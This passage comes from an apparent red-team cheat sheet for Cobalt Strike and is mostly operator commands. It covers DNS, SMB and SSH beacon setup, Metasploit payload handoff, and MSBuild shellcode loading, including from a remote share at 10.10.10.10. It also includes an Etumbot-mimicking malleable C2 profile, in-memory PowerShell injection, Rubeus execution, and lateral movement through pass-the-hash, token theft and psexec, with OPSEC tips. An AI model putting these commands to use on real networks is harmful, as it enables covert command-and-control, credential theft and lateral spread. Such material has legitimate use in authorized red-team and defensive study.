  <li>Create an NS record that points to FQDN of your Cobalt Strike system</li>
</ul>

<p>Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server’s A record.</p>

<ul>
  <li>nslookup jibberish.beacon polling.campaigns.domain.com</li>
  <li>nslookup jibberish.beacon campaigns.domain.com</li>
</ul>

<p>Example of DNS on Digital Ocean:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">NS</span><span class="w">  </span><span class="nx">example.com</span><span class="w">                     </span><span class="nx">directs</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">10.10.10.10.</span><span class="w">            </span><span class="nx">86400</span><span class="w">
</span><span class="n">NS</span><span class="w">  </span><span class="nx">polling.campaigns.example.com</span><span class="w">   </span><span class="nx">directs</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">campaigns.example.com.</span><span class="w">	</span><span class="nx">3600</span><span class="w">
</span><span class="n">A</span><span class="w">	</span><span class="nx">campaigns.example.com</span><span class="w">           </span><span class="nx">directs</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w">	            </span><span class="nx">3600</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">systemctl</span><span class="w"> </span><span class="nx">disable</span><span class="w"> </span><span class="nx">systemd-resolved</span><span class="w">
</span><span class="n">systemctl</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">systemd-resolved</span><span class="w">
</span><span class="n">rm</span><span class="w"> </span><span class="nx">/etc/resolv.conf</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"nameserver 8.8.8.8"</span><span class="w"> </span><span class="err">&gt;</span><span class="w">  </span><span class="nx">/etc/resolv.conf</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"nameserver 8.8.4.4"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w">  </span><span class="nx">/etc/resolv.conf</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Configuration:</p>
<ol>
  <li><strong>host</strong>: campaigns.domain.com</li>
  <li><strong>beacon</strong>: polling.campaigns.domain.com</li>
  <li>Interact with a beacon, and <code class="language-plaintext highlighter-rouge">sleep 0</code></li>
</ol>

<h3 id="smb-beacon">SMB Beacon</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">link</span><span class="w"> </span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">pipename</span><span class="p">]</span><span class="w">
</span><span class="n">connect</span><span class="w"> </span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">port</span><span class="p">]</span><span class="w">
</span><span class="n">unlink</span><span class="w"> </span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="w">
</span><span class="n">jump</span><span class="w"> </span><span class="p">[</span><span class="n">exec</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">pipe</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>SMB Beacon uses Named Pipes. You might encounter these error code while running it.</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Error Code</th>
      <th>Meaning</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>2</td>
      <td>File Not Found</td>
      <td>There is no beacon for you to link to</td>
    </tr>
    <tr>
      <td>5</td>
      <td>Access is denied</td>
      <td>Invalid credentials or you don’t have permission</td>
    </tr>
    <tr>
      <td>53</td>
      <td>Bad Netpath</td>
      <td>You have no trust relationship with the target system. It may or may not be a beacon there.</td>
    </tr>
  </tbody>
</table></div>

<h3 id="ssh-beacon">SSH Beacon</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="c"># deploy a beacon</span><span class="w">
</span><span class="n">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">help</span><span class="w"> </span><span class="nx">ssh</span><span class="w">
</span><span class="n">Use:</span><span class="w"> </span><span class="nx">ssh</span><span class="w"> </span><span class="p">[</span><span class="n">target</span><span class="p">:</span><span class="n">port</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">user</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">pass</span><span class="p">]</span><span class="w">
</span><span class="n">Spawn</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">SSH</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">attempt</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">login</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">specified</span><span class="w"> </span><span class="nx">target</span><span class="w">

</span><span class="n">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">help</span><span class="w"> </span><span class="nx">ssh-key</span><span class="w">
</span><span class="n">Use:</span><span class="w"> </span><span class="nx">ssh</span><span class="w"> </span><span class="p">[</span><span class="n">target</span><span class="p">:</span><span class="n">port</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">user</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/path/to/key.pem</span><span class="p">]</span><span class="w">
</span><span class="n">Spawn</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">SSH</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">attempt</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">specified</span><span class="w"> </span><span class="n">target</span><span class="w">

</span><span class="c"># beacon's commands</span><span class="w">
</span><span class="n">upload</span><span class="w">                    </span><span class="n">Upload</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nx">file</span><span class="w">
</span><span class="n">download</span><span class="w">                  </span><span class="n">Download</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nx">file</span><span class="w">
</span><span class="n">socks</span><span class="w">                     </span><span class="n">Start</span><span class="w"> </span><span class="n">SOCKS4a</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">relay</span><span class="w"> </span><span class="n">traffic</span><span class="w">
</span><span class="n">sudo</span><span class="w">                      </span><span class="n">Run</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">sudo</span><span class="w">
</span><span class="n">rportfwd</span><span class="w">                  </span><span class="n">Setup</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nx">reverse</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="nx">forward</span><span class="w">
</span><span class="n">shell</span><span class="w">                     </span><span class="n">Execute</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">shell</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="metasploit-compatibility">Metasploit compatibility</h3>

<ul>
  <li>Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https</li>
  <li>Set LHOST and LPORT to the beacon</li>
  <li>Set DisablePayloadHandler to True</li>
  <li>Set PrependMigrate to True</li>
  <li>exploit -j</li>
</ul>

<h3 id="custom-payloads">Custom Payloads</h3>

<p>https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="o">*</span><span class="w"> </span><span class="n">Attacks</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Packages</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Payload</span><span class="w"> </span><span class="nx">Generator</span><span class="w"> 
</span><span class="o">*</span><span class="w"> </span><span class="n">Attacks</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Packages</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Scripted</span><span class="w"> </span><span class="nx">Web</span><span class="w"> </span><span class="nx">Delivery</span><span class="w"> </span><span class="p">(</span><span class="n">S</span><span class="p">)</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python2</span><span class="w"> </span><span class="o">.</span><span class="nx">/shellcode_encoder.py</span><span class="w"> </span><span class="nt">-cpp</span><span class="w"> </span><span class="nt">-cs</span><span class="w"> </span><span class="nt">-py</span><span class="w"> </span><span class="nx">payload.bin</span><span class="w"> </span><span class="nx">MySecretPassword</span><span class="w"> </span><span class="nx">xor</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe</span><span class="w"> </span><span class="nx">C:\Windows\Temp\dns_raw_stageless_x64.xml</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="o">%</span><span class="n">windir</span><span class="o">%</span><span class="nx">\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe</span><span class="w"> </span><span class="nx">\\10.10.10.10\Shared\dns_raw_stageless_x86.xml</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="malleable-c2">Malleable C2</h2>

<ul>
  <li>Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles</li>
  <li>Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2</li>
  <li>Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="n">set</span><span class="w"> </span><span class="nx">useragent</span><span class="w"> </span><span class="s2">"SOME AGENT"</span><span class="p">;</span><span class="w"> </span><span class="c"># GOOD</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">useragent</span><span class="w"> </span><span class="s1">'SOME AGENT'</span><span class="p">;</span><span class="w"> </span><span class="c"># BAD</span><span class="w">
</span><span class="n">prepend</span><span class="w"> </span><span class="s2">"This is an example;"</span><span class="p">;</span><span class="w">

</span><span class="c"># Escape Double quotes</span><span class="w">
</span><span class="n">append</span><span class="w"> </span><span class="s2">"here is \"</span><span class="nx">some\</span><span class="s2">" stuff"</span><span class="p">;</span><span class="w">
</span><span class="c"># Escape Backslashes</span><span class="w">
</span><span class="n">append</span><span class="w"> </span><span class="s2">"more \\ stuff"</span><span class="p">;</span><span class="w">
</span><span class="c"># Some special characters do not need escaping</span><span class="w">
</span><span class="n">prepend</span><span class="w"> </span><span class="s2">"!@#</span><span class="err">$</span><span class="s2">%^&amp;*()"</span><span class="p">;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Check a profile with <code class="language-plaintext highlighter-rouge">./c2lint</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre></td><td class="rouge-code"><pre><span class="c">#</span><span class="w">
</span><span class="c"># Etumbot Profile</span><span class="w">
</span><span class="c">#   http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/</span><span class="w">
</span><span class="c">#</span><span class="w">
</span><span class="c"># Author: @harmj0y</span><span class="w">
</span><span class="c">#</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">sample_name</span><span class="w"> </span><span class="s2">"Etumbot"</span><span class="p">;</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">sleeptime</span><span class="w"> </span><span class="s2">"5000"</span><span class="p">;</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">jitter</span><span class="w">    </span><span class="s2">"0"</span><span class="p">;</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">maxdns</span><span class="w">    </span><span class="s2">"255"</span><span class="p">;</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">useragent</span><span class="w"> </span><span class="s2">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)"</span><span class="p">;</span><span class="w">

</span><span class="n">http-get</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">set</span><span class="w"> </span><span class="nx">uri</span><span class="w"> </span><span class="s2">"/image/"</span><span class="p">;</span><span class="w">
    </span><span class="n">client</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Accept"</span><span class="w"> </span><span class="s2">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Referer"</span><span class="w"> </span><span class="s2">"http://www.google.com"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Pragma"</span><span class="w"> </span><span class="s2">"no-cache"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Cache-Control"</span><span class="w"> </span><span class="s2">"no-cache"</span><span class="p">;</span><span class="w">
        </span><span class="n">metadata</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="n">netbios</span><span class="p">;</span><span class="w">
            </span><span class="n">append</span><span class="w"> </span><span class="s2">"-.jpg"</span><span class="p">;</span><span class="w">
            </span><span class="n">uri-append</span><span class="p">;</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="n">server</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Content-Type"</span><span class="w"> </span><span class="s2">"img/jpg"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Server"</span><span class="w"> </span><span class="s2">"Microsoft-IIS/6.0"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"X-Powered-By"</span><span class="w"> </span><span class="s2">"ASP.NET"</span><span class="p">;</span><span class="w">
        </span><span class="n">output</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="n">base64</span><span class="p">;</span><span class="w">
            </span><span class="n">print</span><span class="p">;</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">http-post</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">set</span><span class="w"> </span><span class="nx">uri</span><span class="w"> </span><span class="s2">"/history/"</span><span class="p">;</span><span class="w">
    </span><span class="n">client</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Content-Type"</span><span class="w"> </span><span class="s2">"application/octet-stream"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Referer"</span><span class="w"> </span><span class="s2">"http://www.google.com"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Pragma"</span><span class="w"> </span><span class="s2">"no-cache"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Cache-Control"</span><span class="w"> </span><span class="s2">"no-cache"</span><span class="p">;</span><span class="w">
        </span><span class="n">id</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="n">netbiosu</span><span class="p">;</span><span class="w">
            </span><span class="n">append</span><span class="w"> </span><span class="s2">".asp"</span><span class="p">;</span><span class="w">
            </span><span class="n">uri-append</span><span class="p">;</span><span class="w">
        </span><span class="p">}</span><span class="w">
        </span><span class="n">output</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="n">base64</span><span class="p">;</span><span class="w">
            </span><span class="n">print</span><span class="p">;</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="n">server</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Content-Type"</span><span class="w"> </span><span class="s2">"img/jpg"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"Server"</span><span class="w"> </span><span class="s2">"Microsoft-IIS/6.0"</span><span class="p">;</span><span class="w">
        </span><span class="n">header</span><span class="w"> </span><span class="s2">"X-Powered-By"</span><span class="w"> </span><span class="s2">"ASP.NET"</span><span class="p">;</span><span class="w">
        </span><span class="n">output</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="n">base64</span><span class="p">;</span><span class="w">
            </span><span class="n">print</span><span class="p">;</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="files">Files</h2>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="c"># List the file on the specified directory</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">C:\Path</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Change into the specified working directory</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="p">[</span><span class="n">directory</span><span class="p">]</span><span class="w">

</span><span class="c"># Delete a file\folder</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">rm</span><span class="w"> </span><span class="p">[</span><span class="n">file\folder</span><span class="p">]</span><span class="w">

</span><span class="c"># File copy</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">cp</span><span class="w"> </span><span class="p">[</span><span class="n">src</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">dest</span><span class="p">]</span><span class="w">

</span><span class="c"># Download a file from the path on the Beacon host</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="p">[</span><span class="n">C:\filePath</span><span class="p">]</span><span class="w">

</span><span class="c"># Lists downloads in progress</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">downloads</span><span class="w">

</span><span class="c"># Cancel a download currently in progress</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">cancel</span><span class="w"> </span><span class="p">[</span><span class="o">*</span><span class="n">file</span><span class="o">*</span><span class="p">]</span><span class="w">

</span><span class="c"># Upload a file from the attacker to the current Beacon host</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="p">[</span><span class="n">/path/to/file</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="powershell-and-net">Powershell and .NET</h2>

<h3 id="powershell-commands">Powershell commands</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c"># Import a Powershell .ps1 script from the control server and save it in memory in Beacon</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell-import</span><span class="w"> </span><span class="p">[</span><span class="n">/path/to/script.ps1</span><span class="p">]</span><span class="w">

</span><span class="c"># Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">powershell</span><span class="w"> </span><span class="p">[</span><span class="n">commandlet</span><span class="p">][</span><span class="n">arguments</span><span class="p">]</span><span class="w">

</span><span class="c"># Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">powerpick</span><span class="w"> </span><span class="p">[</span><span class="n">commandlet</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">argument</span><span class="p">]</span><span class="w">

</span><span class="c"># Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">psinject</span><span class="w"> </span><span class="p">[</span><span class="n">pid</span><span class="p">][</span><span class="n">arch</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">commandlet</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">arguments</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="net-remote-execution">.NET remote execution</h3>

<p>Run a local .NET executable as a Beacon post-exploitation job.</p>

<p>Require:</p>
<ul>
  <li>Binaries compiled with the “Any CPU” configuration.</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">execute-assembly</span><span class="w"> </span><span class="p">[</span><span class="n">/path/to/script.exe</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">arguments</span><span class="p">]</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">execute</span><span class="nt">-assembly</span><span class="w"> </span><span class="n">/home/audit/Rubeus.exe</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Tasked</span><span class="w"> </span><span class="nx">beacon</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="nx">program:</span><span class="w"> </span><span class="nx">Rubeus.exe</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">called</span><span class="w"> </span><span class="n">home</span><span class="p">,</span><span class="w"> </span><span class="n">sent</span><span class="p">:</span><span class="w"> </span><span class="mi">318507</span><span class="w"> </span><span class="n">bytes</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="n">output</span><span class="p">:</span><span class="w">

   </span><span class="err">______</span><span class="w">        </span><span class="err">_</span><span class="w">                      
  </span><span class="p">(</span><span class="err">_____</span><span class="w"> </span><span class="n">\</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">                     
   </span><span class="err">_____</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="err">_</span><span class="w">   </span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">__</span><span class="w">  </span><span class="err">_____</span><span class="w"> </span><span class="err">_</span><span class="w">   </span><span class="err">_</span><span class="w">  </span><span class="err">___</span><span class="w"> 
  </span><span class="o">|</span><span class="w">  </span><span class="err">__</span><span class="w">  </span><span class="n">/</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="err">_</span><span class="w"> </span><span class="n">\</span><span class="o">|</span><span class="w"> </span><span class="err">___</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="n">/___</span><span class="p">)</span><span class="w">
  </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">\</span><span class="w"> </span><span class="nx">\</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="err">____</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">___</span><span class="w"> </span><span class="o">|</span><span class="w">
  </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="err">____</span><span class="n">/</span><span class="o">|</span><span class="err">____</span><span class="n">/</span><span class="o">|</span><span class="err">_____</span><span class="p">)</span><span class="err">____</span><span class="n">/</span><span class="p">(</span><span class="err">___</span><span class="n">/</span><span class="w">

  </span><span class="n">v1.</span><span class="mf">4.2</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="lateral-movement">Lateral Movement</h2>

<p>:warning: OPSEC Advice: Use the <strong>spawnto</strong> command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe</p>

<ul>
  <li><strong>portscan:</strong> Performs a portscan on a spesific target.</li>
  <li><strong>runas:</strong> A wrapper of runas.exe, using credentials you can run a command as another user.</li>
  <li><strong>pth:</strong> By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. <br />
:exclamation: This module needs Administrator privileges.</li>
  <li><strong>steal_token:</strong> Steal a token from a specified process.</li>
  <li><strong>make_token:</strong> By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.</li>
  <li><strong>jump:</strong> Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. <br />
:exclamation: The <strong>jump</strong> module will use the current delegation/impersonation token to authenticate on the remote target. <br />
:muscle: We can combine the <strong>jump</strong> module with the <strong>make_token</strong> or <strong>pth</strong> module for a quick “jump” to another target on the network.</li>
  <li><strong>remote-exec:</strong> Execute a command on a remote target using psexec, winrm or wmi. <br />
:exclamation: The <strong>remote-exec</strong> module will use the current delegation/impersonation token to authenticate on the remote target.</li>
  <li><strong>ssh/ssh-key:</strong> Authenticate using ssh with password or private key. Works for both linux and windows hosts.</li>
</ul>

<p>:warning: All the commands launch powershell.exe</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="n">Beacon</span><span class="w"> </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">Exploits</span><span class="w">
</span><span class="o">======================</span><span class="w">
</span><span class="n">jump</span><span class="w"> </span><span class="p">[</span><span class="n">module</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">target</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">listener</span><span class="p">]</span><span class="w"> 

    </span><span class="n">psexec</span><span class="w">	</span><span class="nx">x86</span><span class="w">	</span><span class="nx">Use</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">EXE</span><span class="w"> </span><span class="nx">artifact</span><span class="w">
    </span><span class="n">psexec64</span><span class="w">	</span><span class="nx">x64</span><span class="w">	</span><span class="nx">Use</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">EXE</span><span class="w"> </span><span class="nx">artifact</span><span class="w">
